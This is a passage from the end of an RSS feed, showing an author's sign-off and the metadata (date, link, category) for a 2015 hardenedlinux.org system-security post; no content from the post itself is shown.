&lt;p&gt;Best regards,&lt;/p&gt;

&lt;p&gt;Adam ‘pi3’ Zabrocki&lt;/p&gt;
</description>
        <pubDate>Mon, 06 Jul 2015 06:00:07 +0800</pubDate>
        <link>http://www.hardenedlinux.org/system-security/2015/07/06/badiret-exp.html</link>
        <guid isPermaLink="true">http://www.hardenedlinux.org/system-security/2015/07/06/badiret-exp.html</guid>
        
        
        <category>system-security</category>
        
      </item>
    
  </channel>
</rss>
